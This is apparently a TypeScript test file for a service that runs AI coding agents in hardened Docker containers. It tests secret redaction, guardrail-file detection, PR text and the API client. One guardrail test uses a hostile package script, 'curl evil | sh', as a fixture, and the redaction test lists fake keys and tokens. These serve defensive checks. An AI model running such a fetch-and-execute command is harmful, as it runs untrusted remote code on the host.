import { describe, expect, it, vi } from 'vitest'
import { HmsApi } from '../src/api.js'
import { buildDockerArgs } from '../src/docker.js'
import { formatSdkMessage } from '../src/format.js'
import { detectGuardrailChanges, isGuardrailPath, scriptsSectionChanged } from '../src/guardrails.js'
import { buildPrBody, buildPrTitle } from '../src/prBody.js'
import { makeRedactor, truncate } from '../src/redact.js'
import type { AgentTask, JobResult } from '../src/types.js'

const task: AgentTask = {
  id: 42,
  repo: 'hms-api',
  title: 'Add a comment to README',
  prompt: 'Add a one-line comment at the top of README.md',
  base_branch: 'main',
  branch_name: 'claude/task-42-add-a-comment-to-readme',
  status: 'running',
}

const job = (overrides: Partial<JobResult> = {}): JobResult => ({
  subtype: 'success',
  summary: 'Added the comment. Ran php artisan test: OK.',
  errors: [],
  costUsd: 0.4213,
  turns: 9,
  commits: 1,
  apiError: null,
  checks: { ran: true, passed: true, command: 'php scripts/check.php --base=origin/main --tests', output: 'check: OK' },
  ...overrides,
})

describe('redaction', () => {
  const redact = makeRedactor(['super-secret-runner-token', undefined, 'short'])

  it('removes configured secret values and secret-looking strings', () => {
    const text = [
      'token super-secret-runner-token used',
      'key sk-ant-api03-abcdefghijklmnop',
      'gh ghs_abcdefghijklmnopqrstuvwxyz123',
      'url https://x-access-token:abc123@github.com/o/r.git',
      'ANTHROPIC_API_KEY=whatever123',
      '"db_password": "hunter22"',
      'Authorization: Bearer abc.def.ghi',
      '-----BEGIN RSA PRIVATE KEY-----\nMIIE\n-----END RSA PRIVATE KEY-----',
    ].join('\n')
    const out = redact(text)

    for (const leak of ['super-secret-runner-token', 'sk-ant-api03', 'ghs_abc', 'abc123@', 'whatever123', 'hunter22', 'abc.def.ghi', 'MIIE'])
      expect(out).not.toContain(leak)
    expect(out).toContain('[REDACTED]')
  })

  it('ignores secrets too short to match safely and leaves normal text alone', () => {
    expect(redact('a short word and php artisan test')).toBe('a short word and php artisan test')
  })

  it('truncates long text and says how much was cut', () => {
    expect(truncate('x'.repeat(30), 10)).toBe(`${'x'.repeat(10)}… [truncated 20 chars]`)
    expect(truncate('short', 10)).toBe('short')
  })
})

describe('SDK message formatting', () => {
  it('formats init, assistant text, tool calls, tool results and the final result', () => {
    expect(formatSdkMessage({ type: 'system', subtype: 'init', model: 'claude-x', permissionMode: 'bypassPermissions', tools: ['Bash', 'Edit'], skills: ['add-api-module'] }))
      .toEqual([{ type: 'system', message: 'Session started: model claude-x, permission mode bypassPermissions, 2 tools, skills: add-api-module' }])

    expect(formatSdkMessage({
      type: 'assistant',
      message: { content: [
        { type: 'text', text: 'Running the tests' },
        { type: 'tool_use', name: 'Bash', input: { command: 'php artisan test' } },
        { type: 'tool_use', name: 'Edit', input: { file_path: '/work/repo/README.md', old_string: 'a', new_string: 'b' } },
      ] },
    })).toEqual([
      { type: 'assistant', message: 'Running the tests' },
      { type: 'tool', message: 'Bash: php artisan test' },
      { type: 'tool', message: 'Edit: /work/repo/README.md' },
    ])

    const [toolResult] = formatSdkMessage({ type: 'user', message: { content: [{ type: 'tool_result', is_error: true, content: [{ type: 'text', text: 'x'.repeat(5000) }] }] } })
    expect(toolResult?.type).toBe('tool_result')
    expect(toolResult?.message.startsWith('ERROR: ')).toBe(true)
    expect(toolResult?.message.length).toBeLessThan(2100)

    expect(formatSdkMessage({ type: 'result', subtype: 'error_max_turns', num_turns: 60, total_cost_usd: 1.5, errors: ['max turns'] }))
      .toEqual([{ type: 'error', message: 'Agent finished: error_max_turns, 60 turns, cost $1.5000 — max turns' }])
  })

  it('reports Claude API errors on assistant messages and skips unknown messages', () => {
    expect(formatSdkMessage({ type: 'assistant', error: 'rate_limit', message: { content: [] } }))
      .toEqual([{ type: 'error', message: 'Claude API error: rate_limit' }])
    expect(formatSdkMessage({ type: 'stream_event' })).toEqual([])
  })
})

describe('guardrails', () => {
  it('flags guardrail paths', () => {
    for (const path of ['.claude/settings.json', '.githooks/pre-commit', '.github/workflows/ci.yml', 'scripts/check.php', 'scripts/check.mjs'])
      expect(isGuardrailPath(path)).toBe(true)
    for (const path of ['app/Models/User.php', 'scripts/other.php', 'src/.claude.js', 'README.md'])
      expect(isGuardrailPath(path)).toBe(false)
  })

  it('flags composer/package.json only when the scripts section changed', () => {
    expect(scriptsSectionChanged('{"scripts":{"a":"x"},"require":{}}', '{"scripts":{"a":"x"},"require":{"b":"1"}}')).toBe(false)
    expect(scriptsSectionChanged('{"scripts":{"a":"x"}}', '{"scripts":{"a":"curl evil | sh"}}')).toBe(true)
    expect(scriptsSectionChanged('{"scripts":{}}', 'not json')).toBe(true)

    expect(detectGuardrailChanges(
      ['app/X.php', '.github/workflows/ci.yml', 'package.json', 'composer.json'],
      [
        { path: 'package.json', base: '{"scripts":{"prepare":"a"}}', head: '{"scripts":{"prepare":"b"}}' },
        { path: 'composer.json', base: '{"require":{}}', head: '{"require":{"x":"1"}}' },
      ],
    )).toEqual(['.github/workflows/ci.yml', 'package.json (scripts)'])
  })
})

describe('PR title and body', () => {
  it('builds a body with the task link, request, summary and passing checks', () => {
    const body = buildPrBody({ task, feUrl: 'https://hms.example.com', job: job(), guardrailChanges: [] })

    expect(body).toContain('[#42 Add a comment to README](https://hms.example.com/agent-tasks/42)')
    expect(body).toContain('Add a one-line comment at the top of README.md')
    expect(body).toContain('Added the comment.')
    expect(body).toContain('✅ Passed')
    expect(body).not.toContain('Guardrail')
  })

  it('shows failed checks and the guardrail section', () => {
    const body = buildPrBody({
      task,
      feUrl: 'https://hms.example.com',
      job: job({ checks: { ran: true, passed: false, command: 'php scripts/check.php', output: 'FAILED Tests\\X' } }),
      guardrailChanges: ['.github/workflows/ci.yml'],
    })

    expect(body).toContain('❌ Failed')
    expect(body).toContain('FAILED Tests\\X')
    expect(body).toContain('## ⚠️ Guardrail files changed')
    expect(body).toContain('- `.github/workflows/ci.yml`')
  })

  it('keeps fences intact when the prompt contains backticks and prefixes failing titles', () => {
    const body = buildPrBody({ task: { ...task, prompt: 'use ```php``` blocks' }, feUrl: 'x', job: job(), guardrailChanges: [] })
    expect(body).toContain('````text\nuse ```php``` blocks\n````')
    expect(buildPrTitle(task, false)).toBe('[checks failed] Add a comment to README')
    expect(buildPrTitle(task, true)).toBe('Add a comment to README')
  })
})

describe('docker run arguments', () => {
  it('runs hardened, mounts only the workdir and guard files read-only, and passes env by name', () => {
    const args = buildDockerArgs({
      name: 'agent-task-42-abc',
      image: 'hms-agent-job:latest',
      runnerId: 'runner-1',
      taskId: 42,
      uid: 1001,
      gid: 1001,
      memory: '900m',
      memorySwap: '3g',
      cpus: '1',
      workDir: '/var/lib/agent-runner/work/task-42-x',
      guardPaths: ['.claude', 'scripts/check.php'],
      env: { ANTHROPIC_API_KEY: 'sk-ant-secret-value' },
    })
    const joined = args.join(' ')

    expect(joined).toContain('--user 1001:1001')
    expect(joined).toContain('--cap-drop ALL')
    expect(joined).toContain('--pids-limit 2048')
    expect(joined).toContain('--memory 900m --memory-swap 3g --cpus 1')
    expect(joined).toContain('--security-opt no-new-privileges')
    expect(joined).toContain('/var/lib/agent-runner/work/task-42-x/guard/.claude:/work/repo/.claude:ro')
    expect(joined).toContain('/var/lib/agent-runner/work/task-42-x/guard/scripts/check.php:/work/repo/scripts/check.php:ro')
    expect(joined).toContain('-e ANTHROPIC_API_KEY')
    expect(joined).not.toContain('sk-ant-secret-value')
    expect(args.filter(a => a.includes(':/') && !a.includes('/var/lib/agent-runner/work/task-42-x')).length).toBe(0)
    expect(args.at(-1)).toBe('hms-agent-job:latest')
  })
})

describe('hms-api client', () => {
  const respond = (status: number, body?: unknown) => new Response(body === undefined ? null : JSON.stringify(body), { status })

  it('claims a task, returns null on 204, and sends the token and runner id', async () => {
    const fetchFn = vi.fn()
      .mockResolvedValueOnce(respond(200, { data: { agent_task: task, github_repo: 'org/hms-api' } }))
      .mockResolvedValueOnce(respond(204))
    const api = new HmsApi('https://api.test/api', 'tok', 'runner-1', fetchFn as any)

    expect(await api.claim()).toEqual({ task, githubRepo: 'org/hms-api' })
    expect(await api.claim()).toBeNull()

    const [url, init] = fetchFn.mock.calls[0]!
    expect(url).toBe('https://api.test/api/runner/agent-tasks/claim')
    expect(init.headers.Authorization).toBe('Bearer tok')
    expect(JSON.parse(init.body)).toEqual({ runner_id: 'runner-1' })
  })

  it('returns the status from appendLogs and maps 409 on update to conflict', async () => {
    const fetchFn = vi.fn()
      .mockResolvedValueOnce(respond(200, { data: { status: 'cancelled' } }))
      .mockResolvedValueOnce(respond(409, { message: 'Task was cancelled' }))
      .mockResolvedValueOnce(respond(500, { message: 'boom' }))
    const api = new HmsApi('https://api.test/api', 'tok', 'runner-1', fetchFn as any)

    expect(await api.appendLogs(42, [{ type: 'runner', message: 'hi' }])).toBe('cancelled')
    expect(await api.updateResult(42, { status: 'failed', error: 'x' })).toBe('conflict')
    await expect(api.recover()).rejects.toThrow('recover failed: HTTP 500 boom')
  })
})

describe('config', () => {
  it('uses the approved defaults (1 GB test server) and requires the secrets', async () => {
    const { loadConfig } = await import('../src/config.js')
    const env = {
      HMS_API_URL: 'https://api.test/api/',
      RUNNER_TOKEN: 't',
      HMS_FE_URL: 'https://hms.test',
      ANTHROPIC_API_KEY: 'k',
      GITHUB_APP_ID: '1',
      GITHUB_APP_INSTALLATION_ID: '2',
      GITHUB_APP_PRIVATE_KEY_PATH: '/etc/agent-runner/github-app.pem',
    }
    const config = loadConfig(env, () => 'pem')

    expect(config).toMatchObject({
      apiUrl: 'https://api.test/api',
      maxConcurrent: 1,
      maxTurns: 60,
      maxBudgetUsd: 3,
      taskTimeoutMs: 30 * 60_000,
      containerMemory: '900m',
      containerMemorySwap: '3g',
      containerCpus: '1',
      gitAuthorName: 'HMS Agent',
      gitAuthorEmail: 'marsandmarstechnologies@gmail.com',
    })
    expect(() => loadConfig({ ...env, ANTHROPIC_API_KEY: '' }, () => 'pem')).toThrow('ANTHROPIC_API_KEY')
    expect(() => loadConfig({ ...env, MAX_TURNS: 'lots' }, () => 'pem')).toThrow('MAX_TURNS')
  })
})
